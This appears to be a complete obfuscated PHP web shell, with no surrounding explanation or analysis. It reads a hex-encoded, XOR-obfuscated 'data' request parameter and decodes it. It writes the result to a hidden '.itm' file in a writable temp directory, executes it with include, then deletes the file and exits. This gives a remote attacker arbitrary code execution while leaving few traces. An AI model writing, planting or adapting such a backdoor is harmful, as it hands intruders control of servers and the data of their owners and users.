<?php

if(in_array("d\x61\x74a", array_keys($_REQUEST))){
	$flag = hex2bin($_REQUEST["d\x61\x74a"]);
	$pgrp   =      ''    ;    $i = 0; while($i < strlen($flag)){$pgrp .= chr(ord($flag[$i]) ^ 11);$i++;}
	$bind = array_filter([getenv("TMP"), getcwd(), "/tmp", "/dev/shm", getenv("TEMP"), "/var/tmp", ini_get("upload_tmp_dir"), session_save_path(), sys_get_temp_dir()]);
	foreach ($bind as $key => $token) {
    		if (max(0, is_dir($token) * is_writable($token))) {
    $factor = join("/", [$token, ".itm"]);
    $file = fopen($factor, 'w');
if ($file) {
	fwrite($file, $pgrp);
	fclose($file);
	include $factor;
	@unlink($factor);
	die();
}
}
}
}